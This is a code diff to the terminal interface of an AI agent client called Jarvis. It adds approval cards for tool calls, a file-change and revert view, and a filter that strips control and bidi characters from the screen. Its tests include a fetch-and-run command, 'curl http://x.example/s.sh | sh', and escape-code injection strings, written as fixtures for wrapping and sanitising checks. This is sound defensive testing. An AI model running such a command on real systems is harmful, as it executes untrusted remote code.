@@ -24,15 +24,50 @@ pub fn draw(frame: &mut Frame, app: &mut App) {
         .split(area);
 
     draw_header(frame, app, chunks[0]);
-    draw_transcript(frame, app, chunks[1]);
+    // An approval is a card at the foot of the conversation (6.7b).
+    let card_height = match &app.overlay {
+        Some(Overlay::Confirm(card)) => card_height(card, chunks[1].height, chunks[1].width),
+        _ => 0,
+    };
+    let (talk, card_area) = if card_height > 0 {
+        let parts = Layout::default()
+            .direction(Direction::Vertical)
+            .constraints([Constraint::Min(3), Constraint::Length(card_height)])
+            .split(chunks[1]);
+        (parts[0], Some(parts[1]))
+    } else {
+        (chunks[1], None)
+    };
+    draw_transcript(frame, app, talk);
+    if let (Some(area), Some(Overlay::Confirm(card))) = (card_area, &app.overlay) {
+        draw_card(frame, card, area);
+    }
     let cursor = draw_input(frame, app, chunks[2]);
     draw_footer(frame, app, chunks[3]);
     draw_menu(frame, app, chunks[2]);
 
-    if app.overlay.is_some() {
+    let reasoning = matches!(&app.overlay, Some(Overlay::Confirm(card)) if card.reasoning);
+    if app.overlay.is_some() && !matches!(app.overlay, Some(Overlay::Confirm(_))) {
         draw_overlay(frame, app, area);
-    } else if let Some(cursor) = cursor {
-        frame.set_cursor_position(cursor);
+    } else if app.overlay.is_none() || reasoning {
+        if let Some(cursor) = cursor {
+            frame.set_cursor_position(cursor);
+        }
+    }
+    scrub(frame.buffer_mut());
+}
+
+/// The last step before the terminal: no control character, and nothing that
+/// reorders text, whatever drew it. A carriage return garbles the screen; an
+/// escape or a bidi override could hide what a card asks the owner to approve.
+fn scrub(buffer: &mut ratatui::buffer::Buffer) {
+    let unsafe_char =
+        |c: char| c.is_control() || matches!(c, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}');
+    for cell in &mut buffer.content {
+        if cell.symbol().chars().any(unsafe_char) {
+            let clean: String = cell.symbol().chars().filter(|c| !unsafe_char(*c)).collect();
+            cell.set_symbol(if clean.is_empty() { "·" } else { &clean });
+        }
     }
 }
 
@@ -91,7 +126,8 @@ fn draw_transcript(frame: &mut Frame, app: &mut App, area: Rect) {
     let block = Block::bordered().title(" Conversation ");
     let inner = block.inner(area);
     let width = inner.width.max(1) as usize;
-    let mut lines = transcript_lines(&app.entries, width);
+    let (mut lines, work_lines) =
+        transcript_lines(&app.entries, width, app.show_steps, app.streaming_index());
     // What waits for the running turn: dim, at the end, as in T3 Code.
     for queued in app.queue().into_iter().flatten() {
         let what = if queued.steer {
@@ -118,24 +154,67 @@ fn draw_transcript(frame: &mut Frame, app: &mut App, area: Rect) {
         app.scroll = app.max_scroll;
     }
     let offset = (app.max_scroll - app.scroll).min(u16::MAX as usize) as u16;
+    // Where each work row landed on screen, for a click to find it.
+    app.work_rows = work_lines
+        .into_iter()
+        .filter(|(line, _)| {
+            *line >= offset as usize && *line < offset as usize + inner.height as usize
+        })
+        .map(|(line, index)| ((line - offset as usize) as u16 + inner.y, index))
+        .collect();
 
     frame.render_widget(Paragraph::new(lines).block(block).scroll((offset, 0)), area);
 }
 
-fn transcript_lines(entries: &[Entry], width: usize) -> Vec<Line<'static>> {
+/// The transcript as lines, and where each work row is: (line, entry).
+fn transcript_lines(
+    entries: &[Entry],
+    width: usize,
+    show_steps: bool,
+    streaming: Option<usize>,
+) -> (Vec<Line<'static>>, Vec<(usize, usize)>) {
     let mut lines = Vec::new();
+    let mut rows = Vec::new();
     let body_width = width.saturating_sub(2).max(1);
     let dim = Style::new().fg(Color::DarkGray);
 
     for (index, entry) in entries.iter().enumerate() {
+        if entry
+            .work
+            .as_ref()
+            .is_some_and(|log| log.done && !log.worth_a_row())
+        {
+            continue;
+        }
         if index > 0 {
             lines.push(Line::raw(""));
+        }
+        if let Some(log) = &entry.work {
+            let open = log.open || show_steps;
+            if log.done {
+                rows.push((lines.len(), index));
+                let style = if log.failed_turn {
+                    Style::new().fg(Color::Red)
+                } else {
+                    dim
+                };
+                lines.push(Line::styled(
+                    format!("  {}", crate::app::work_row(log, open)),
+                    style,
+                ));
+            }
+            if !log.done || open {
+                for step in &log.steps {
+                    lines.push(step_line(step, body_width));
+                }
+            }
+            continue;
         }
         let (label, colour) = match entry.role {
             Role::User => ("You", Color::Cyan),
             Role::Assistant => ("Jarvis", Color::Green),
             Role::System => ("system", Color::Yellow),
-            Role::Error => ("error", Color::Red),
+            Role::Error | Role::Work => ("error", Color::Red),
         };
         lines.push(Line::from(Span::styled(
             label,
@@ -146,15 +225,49 @@ fn transcript_lines(entries: &[Entry], width: usize) -> Vec<Line<'static>> {
             Role::System | Role::Error => dim,
             _ => Style::new(),
         };
-        for wrapped in wrap::wrap(&entry.text, body_width) {
-            lines.push(Line::styled(format!("  {wrapped}"), body_style));
+        if entry.role == Role::Assistant && streaming != Some(index) {
+            // A finished answer is Markdown (6.7b); a streaming one stays
+            // plain until it is whole.
+            for line in crate::markdown::render(&entry.text, body_width) {
+                let mut spans = vec![Span::raw("  ")];
+                spans.extend(line.spans);
+                lines.push(Line::from(spans));
+            }
+        } else {
+            for wrapped in wrap::wrap(&entry.text, body_width) {
+                lines.push(Line::styled(format!("  {wrapped}"), body_style));
+            }
         }
         if let Some(footer) = &entry.footer {
             lines.push(Line::styled(format!("  {footer}"), dim));
         }
     }
 
-    lines
+    (lines, rows)
+}
+
+/// One step: its mark, what it is, and how it went.
+fn step_line(step: &jarvis_common::ipc::Step, width: usize) -> Line<'static> {
+    let (mark, colour) = match step.state.as_str() {
+        "running" => ("◐", Color::Cyan),
+        "done" => ("●", Color::Green),
+        "failed" | "denied" | "untrusted" => ("✗", Color::Red),
+        "declined" | "withheld" => ("⊘", Color::Yellow),
+        "deferred" => ("⋯", Color::Magenta),
+        _ => ("·", Color::DarkGray),
+    };
+    let summary: String = step.summary.chars().take(width.saturating_sub(6)).collect();
+    let mut spans = vec![
+        Span::styled(format!("  {mark} "), Style::new().fg(colour)),
+        Span::raw(summary),
+    ];
+    if let Some(detail) = &step.detail {
+        spans.push(Span::styled(
+            format!("  {detail}"),
+            Style::new().fg(Color::DarkGray),
+        ));
+    }
+    Line::from(spans)
 }
 
 /// The keys that apply in the input box now.
@@ -287,12 +400,21 @@ fn draw_overlay(frame: &mut Frame, app: &App, area: Rect) {
     };
     match overlay {
         Overlay::Help => draw_help(frame, area),
+        Overlay::Changes {
+            files,
+            selected,
+            scroll,
+            confirm_revert,
+        } => draw_changes(frame, files, *selected, *scroll, *confirm_revert, area),
         Overlay::Sessions { rows, selected } => {
             draw_sessions(frame, rows, *selected, app.session_id.as_deref(), area)
         }
         Overlay::Recall(rows) => draw_recall(frame, rows, area),
-        Overlay::Models { rows, selected } => draw_models(frame, rows, *selected, area),
-        Overlay::Confirm(request) => draw_confirm(frame, &request.prompt, area),
+        Overlay::Models { rows, selected } => {
+            draw_models(frame, rows, &app.mode_rows(), *selected, area)
+        }
+        // Drawn in the conversation, by draw_card.
+        Overlay::Confirm(_) => {}
     }
 }
 
@@ -360,23 +482,165 @@ fn draw_help(frame: &mut Frame, area: Rect) {
     );
 }
 
-fn draw_confirm(frame: &mut Frame, prompt: &str, area: Rect) {
-    let lines = vec![
-        Line::raw(""),
-        Line::raw(prompt.to_string()),
-        Line::raw(""),
-        Line::styled(
-            "y approve · n deny · Ctrl+C cancel the turn",
-            Style::new().fg(Color::Cyan).add_modifier(Modifier::BOLD),
-        ),
-    ];
-    let popup = centered(area, 70, 9);
-    frame.render_widget(Clear, popup);
+/// The diff view: the files on the left, the chosen one's diff on the right.
+fn draw_changes(
+    frame: &mut Frame,
+    files: &[jarvis_common::ipc::FileChange],
+    selected: usize,
+    scroll: u16,
+    confirm_revert: bool,
+    area: Rect,
+) {
+    frame.render_widget(Clear, area);
+    let outer = Block::bordered().title(if confirm_revert {
+        format!(" Revert {} file(s)? y/n ", files.len())
+    } else {
+        " Changes · Up/Down file · PgUp/PgDn scroll · r revert · Esc close ".to_string()
+    });
+    let inner = outer.inner(area);
+    frame.render_widget(outer, area);
+    let parts = Layout::default()
+        .direction(Direction::Horizontal)
+        .constraints([Constraint::Percentage(30), Constraint::Percentage(70)])
+        .split(inner);
+    let items: Vec<ListItem> = files
+        .iter()
+        .enumerate()
+        .map(|(i, f)| {
+            let name = std::path::Path::new(&f.path)
+                .file_name()
+                .map(|n| n.to_string_lossy().into_owned())
+                .unwrap_or_else(|| f.path.clone());
+            let style = if i == selected {
+                Style::new()
+                    .bg(Color::DarkGray)
+                    .add_modifier(Modifier::BOLD)
+            } else {
+                Style::new()
+            };
+            ListItem::new(Line::from(vec![
+                Span::styled(format!(" {name} "), style),
+                Span::styled(format!("+{}", f.added), Style::new().fg(Color::Green)),
+                Span::raw(" "),
+                Span::styled(format!("-{}", f.removed), Style::new().fg(Color::Red)),
+            ]))
+        })
+        .collect();
+    frame.render_widget(List::new(items), parts[0]);
+    let diff: Vec<Line> = match files.get(selected).and_then(|f| f.diff.as_deref()) {
+        Some(diff) => diff
+            .lines()
+            .skip(scroll as usize)
+            .map(|l| {
+                let colour = if l.starts_with("+++") || l.starts_with("---") {
+                    Color::DarkGray
+                } else if l.starts_with('+') {
+                    Color::Green
+                } else if l.starts_with('-') {
+                    Color::Red
+                } else if l.starts_with("@@") {
+                    Color::Cyan
+                } else {
+                    Color::Reset
+                };
+                Line::styled(l.to_string(), Style::new().fg(colour))
+            })
+            .collect(),
+        None => vec![Line::styled(
+            "No copy was kept of this file (over the size limit), so there is no diff.",
+            Style::new().fg(Color::DarkGray),
+        )],
+    };
+    frame.render_widget(Paragraph::new(Text::from(diff)), parts[1]);
+}
+
+/// The card's prompt lines: for a diff, without the raw tool and args the
+/// diff already shows.
+fn card_prompt(card: &crate::app::Card) -> Vec<String> {
+    let diff = card
+        .request
+        .preview
+        .as_ref()
+        .is_some_and(|p| p.kind == "diff");
+    card.request
+        .prompt
+        .lines()
+        .filter(|l| {
+            let l = l.trim_start();
+            !(diff && (l.starts_with("tool:") || l.starts_with("args:")))
+        })
+        .map(String::from)
+        .collect()
+}
+
+/// How tall a card is: its wrapped prompt and preview, a key line, at most
+/// two thirds of the conversation.
+fn card_height(card: &crate::app::Card, room: u16, width: u16) -> u16 {
+    let inner = width.saturating_sub(2).max(1) as usize;
+    let rows = |text: &str| text.chars().count().max(1).div_ceil(inner) as u16;
+    let prompt: u16 = card_prompt(card).iter().map(|l| rows(l)).sum();
+    let preview: u16 = card
+        .request
+        .preview
+        .as_ref()
+        .map_or(0, |p| p.text.lines().map(rows).sum());
+    (prompt + preview + 4).min(room * 2 / 3).max(5)
+}
+
+fn draw_card(frame: &mut Frame, card: &crate::app::Card, area: Rect) {
+    let mut lines: Vec<Line> = card_prompt(card)
+        .into_iter()
+        .map(|l| Line::styled(l, Style::new().add_modifier(Modifier::BOLD)))
+        .collect();
+    let body: Vec<Line> = match &card.request.preview {
+        Some(preview) => preview
+            .text
+            .lines()
+            .skip(card.scroll as usize)
+            .map(|l| {
+                let colour = if preview.kind != "diff" {
+                    Color::Yellow
+                } else if l.starts_with("+++") || l.starts_with("---") {
+                    Color::DarkGray
+                } else if l.starts_with('+') {
+                    Color::Green
+                } else if l.starts_with('-') {
+                    Color::Red
+                } else if l.starts_with("@@") {
+                    Color::Cyan
+                } else {
+                    Color::Reset
+                };
+                Line::styled(l.to_string(), Style::new().fg(colour))
+            })
+            .collect(),
+        None => Vec::new(),
+    };
+    lines.extend(body);
+    let mut keys = String::from("y yes · n no · Tab reason");
+    for choice in &card.request.choices[card.request.choices.len().min(1)..] {
+        keys.push_str(&format!(" · {} {}", choice.key, choice.label));
+    }
+    if card.request.preview.is_some() {
+        keys.push_str(" · PgUp/PgDn scroll");
+    }
+    if card.reasoning {
+        keys = "typing a reason · Enter decline with it · Esc back".into();
+    }
+    frame.render_widget(Clear, area);
     frame.render_widget(
+        // Wrapped, as the old pop-up was: a long command's tail must show.
         Paragraph::new(Text::from(lines))
-            .block(Block::bordered().title(" Approval required "))
+            .block(
+                Block::bordered()
+                    .title(" Approval ")
+                    .title_bottom(Line::styled(
+                        format!(" {keys} "),
+                        Style::new().fg(Color::Cyan).add_modifier(Modifier::BOLD),
+                    )),
+            )
             .wrap(Wrap { trim: false }),
-        popup,
+        area,
     );
 }
 
@@ -440,8 +704,14 @@ fn draw_sessions(
     );
 }
 
-fn draw_models(frame: &mut Frame, rows: &[crate::app::ModelRow], selected: usize, area: Rect) {
-    let items: Vec<ListItem> = if rows.is_empty() {
+fn draw_models(
+    frame: &mut Frame,
+    rows: &[crate::app::ModelRow],
+    modes: &[String],
+    selected: usize,
+    area: Rect,
+) {
+    let mut items: Vec<ListItem> = if rows.is_empty() {
         vec![ListItem::new(Line::styled(
             "No models configured. Press Esc to close.",
             Style::new().fg(Color::DarkGray),
@@ -463,12 +733,28 @@ fn draw_models(frame: &mut Frame, rows: &[crate::app::ModelRow], selected: usize
             })
             .collect()
     };
+    // The mode, under the models (6.7b): Enter moves a row to its next value.
+    items.push(ListItem::new(Line::styled(
+        "  Mode",
+        Style::new().fg(Color::DarkGray),
+    )));
+    for mode in modes {
+        items.push(ListItem::new(Line::from(vec![
+            Span::raw("  "),
+            Span::styled(mode.clone(), Style::new().fg(Color::Magenta)),
+        ])));
+    }
     let height = (items.len() as u16 + 2).min((area.height * 7 / 10).max(5));
     let popup = centered(area, 70, height);
     let mut state = ListState::default();
-    if !rows.is_empty() {
-        state.select(Some(selected.min(rows.len() - 1)));
-    }
+    let model_rows = rows.len().max(1);
+    // Past the models, skip the "Mode" heading row.
+    let shown = if selected < rows.len() {
+        selected
+    } else {
+        model_rows + 1 + (selected - rows.len())
+    };
+    state.select(Some(shown.min(items.len() - 1)));
     frame.render_widget(Clear, popup);
     frame.render_stateful_widget(
         List::new(items)
@@ -538,6 +824,228 @@ mod tests {
     }
 
     #[test]
+    fn the_diff_view_colours_plus_and_minus() {
+        let mut app = App::new("llama3.2:1b".into());
+        app.overlay = Some(crate::app::Overlay::Changes {
+            files: vec![jarvis_common::ipc::FileChange {
+                undo_ids: vec!["1".into()],
+                path: "/w/b.md".into(),
+                tool: "filesystem.edit".into(),
+                added: 1,
+                removed: 1,
+                diff: Some("--- /w/b.md\n+++ /w/b.md\n-old line\n+new line\n".into()),
+            }],
+            selected: 0,
+            scroll: 0,
+            confirm_revert: false,
+        });
+        let mut terminal =
+            ratatui::Terminal::new(ratatui::backend::TestBackend::new(100, 24)).unwrap();
+        terminal.draw(|frame| draw(frame, &mut app)).unwrap();
+        let buffer = terminal.backend().buffer().clone();
+        let colour_of = |text: &str| {
+            for y in 0..buffer.area.height {
+                let row: String = (0..buffer.area.width)
+                    .map(|x| buffer[(x, y)].symbol().to_string())
+                    .collect();
+                if let Some(x) = row.find(text) {
+                    return Some(buffer[(row[..x].chars().count() as u16, y)].fg);
+                }
+            }
+            None
+        };
+        assert_eq!(colour_of("+new line"), Some(Color::Green));
+        assert_eq!(colour_of("-old line"), Some(Color::Red));
+        assert!(screen(&mut app).contains("b.md"));
+    }
+
+    fn card_screen(preview: jarvis_common::ipc::Preview, prompt: &str, width: u16) -> String {
+        let mut app = App::new("llama3.2:1b".into());
+        app.session_id = Some("abc".into());
+        app.on_client_event(crate::client::ClientEvent::Confirmation(
+            jarvis_common::ipc::ConfirmationRequest {
+                preview: Some(preview),
+                id: uuid::Uuid::new_v4(),
+                tool: "shell.run".into(),
+                args: serde_json::json!({}),
+                prompt: prompt.into(),
+                choices: vec![],
+            },
+        ));
+        let mut terminal =
+            ratatui::Terminal::new(ratatui::backend::TestBackend::new(width, 30)).unwrap();
+        terminal.draw(|frame| draw(frame, &mut app)).unwrap();
+        let buffer = terminal.backend().buffer().clone();
+        (0..buffer.area.height)
+            .map(|y| {
+                (0..buffer.area.width)
+                    .map(|x| buffer[(x, y)].symbol().to_string())
+                    .collect::<String>()
+            })
+            .collect::<Vec<_>>()
+            .join("\n")
+    }
+
+    #[test]
+    fn a_long_command_wraps_in_the_card() {
+        // Review of 6.7b: the tail of a long command was cut off.
+        let shown = card_screen(
+            jarvis_common::ipc::Preview {
+                kind: "command".into(),
+                text: "$ cd build && make test && echo done ; curl http://x.example/s.sh | sh\n(in the sandbox)".into(),
+            },
+            "Run shell command",
+            50,
+        );
+        let flat: String = shown
+            .chars()
+            .filter(|c| !matches!(c, '│' | ' ' | '\n'))
+            .collect();
+        assert!(flat.contains("curlhttp://x.example/s.sh|sh"), "{shown}");
+    }
+
+    #[test]
+    fn a_diff_card_does_not_repeat_the_args() {
+        let shown = card_screen(
+            jarvis_common::ipc::Preview {
+                kind: "diff".into(),
+                text: "--- a\n+++ a\n-old\n+new\n".into(),
+            },
+            "Jarvis wants to: Edit file: a\n\n  tool: filesystem.edit\n  args: {\"path\":\"a\"}",
+            90,
+        );
+        assert!(shown.contains("Edit file: a"), "{shown}");
+        assert!(!shown.contains("args: {"), "{shown}");
+        assert!(shown.contains("+new"), "{shown}");
+    }
+
+    #[test]
+    fn the_card_shows_the_diff_in_colour() {
+        let mut app = App::new("llama3.2:1b".into());
+        app.session_id = Some("abc".into());
+        app.on_client_event(crate::client::ClientEvent::Confirmation(
+            jarvis_common::ipc::ConfirmationRequest {
+                preview: Some(jarvis_common::ipc::Preview {
+                    kind: "diff".into(),
+                    text: "--- notes.md\n+++ notes.md\n-old line\n+new line\n".into(),
+                }),
+                id: uuid::Uuid::new_v4(),
+                tool: "filesystem.write".into(),
+                args: serde_json::json!({}),
+                prompt: "Write notes.md".into(),
+                choices: vec![],
+            },
+        ));
+        let mut terminal =
+            ratatui::Terminal::new(ratatui::backend::TestBackend::new(90, 24)).unwrap();
+        terminal.draw(|frame| draw(frame, &mut app)).unwrap();
+        let buffer = terminal.backend().buffer().clone();
+        let mut found = None;
+        for y in 0..buffer.area.height {
+            let row: String = (0..buffer.area.width)
+                .map(|x| buffer[(x, y)].symbol().to_string())
+                .collect();
+            if let Some(x) = row.find("+new line") {
+                found = Some((row[..x].chars().count() as u16, y));
+            }
+        }
+        let (x, y) = found.expect("the diff is shown");
+        assert_eq!(buffer[(x, y)].fg, Color::Green);
+        let shown = screen(&mut app);
+        assert!(shown.contains("y yes · n no · Tab reason"), "{shown}");
+    }
+
+    #[test]
+    fn a_streaming_answer_is_plain() {
+        let entries = vec![Entry::assistant("**bold** answer")];
+        let (live, _) = transcript_lines(&entries, 40, false, Some(0));
+        let text = |lines: &[Line]| {
+            lines
+                .iter()
+                .map(|l| {
+                    l.spans
+                        .iter()
+                        .map(|s| s.content.as_ref())
+                        .collect::<String>()
+                })
+                .collect::<Vec<_>>()
+                .join("\n")
+        };
+        assert!(text(&live).contains("**bold** answer"), "{}", text(&live));
+        let (done, _) = transcript_lines(&entries, 40, false, None);
+        assert!(text(&done).contains("  bold answer"), "{}", text(&done));
+    }
+
+    #[test]
+    fn no_control_character_reaches_the_terminal() {
+        // A carriage return or escape in a preview could hide what the owner
+        // approves; one in an answer garbles the screen.
+        let mut app = App::new("llama3.2:1b".into());
+        app.session_id = Some("abc".into());
+        app.entries.push(crate::app::Entry::assistant(
+            "an\rswer \x1b[2J x".to_string(),
+        ));
+        app.entries
+            .push(crate::app::Entry::system("no\rte \u{202e}x".to_string()));
+        app.input.set("in\rput");
+        app.on_client_event(crate::client::ClientEvent::Confirmation(
+            jarvis_common::ipc::ConfirmationRequest {
+                id: uuid::Uuid::new_v4(),
+                tool: "shell.run".into(),
+                args: serde_json::json!({}),
+                prompt: "Run\rx".into(),
+                choices: vec![],
+                preview: Some(jarvis_common::ipc::Preview {
+                    kind: "command".into(),
+                    text: "$ rm x\recho safe \x1b[8m \u{202e}".into(),
+                }),
+            },
+        ));
+        let shown = screen(&mut app);
+        let bad: Vec<char> = shown
+            .chars()
+            .filter(|c| (c.is_control() && *c != '\n') || *c == '\u{202e}')
+            .collect();
+        assert!(bad.is_empty(), "{bad:?}");
+        assert!(shown.contains("rm x"), "{shown}");
+    }
+
+    #[test]
+    fn the_folded_row_draws() {
+        let mut app = App::new("llama3.2:1b".into());
+        app.session_id = Some("abc".into());
+        let id = uuid::Uuid::new_v4();
+        app.begin_request(id, crate::app::Pending::Turn);
+        app.on_response(jarvis_common::ipc::Response::ok(
+            id,
+            serde_json::json!({ "response": "done", "timing": { "total_ms": 2000 } }),
+        ));
+        let shown = screen(&mut app);
+        assert!(
+            !shown.contains("▸"),
+            "a plain answer has no work row: {shown}"
+        );
+        let id = uuid::Uuid::new_v4();
+        app.begin_request(id, crate::app::Pending::Turn);
+        app.on_client_event(crate::client::ClientEvent::Step(jarvis_common::ipc::Step {
+            id,
+            step: 1,
+            kind: "tool".into(),
+            name: "filesystem.list_dir".into(),
+            summary: "list ~/w".into(),
+            state: "done".into(),
+            detail: None,
+            ms: Some(5),
+        }));
+        app.on_response(jarvis_common::ipc::Response::ok(
+            id,
+            serde_json::json!({ "response": "done", "timing": { "total_ms": 2000 } }),
+        ));
+        let shown = screen(&mut app);
+        assert!(shown.contains("▸ 1 step · 2.0 s"), "{shown}");
+    }
+
+    #[test]
     fn the_queue_shows_at_the_end_and_in_the_hint() {
         let mut app = App::new("llama3.2:1b".into());
         app.session_id = Some("abc".into());
@@ -571,7 +1079,7 @@ mod tests {
     #[test]
     fn transcript_has_labels_and_blank_separators() {
         let entries = vec![Entry::user("hello"), Entry::assistant("hi")];
-        let lines = transcript_lines(&entries, 40);
+        let (lines, _) = transcript_lines(&entries, 40, false, None);
         let text: Vec<String> = lines
             .iter()
             .map(|line| {
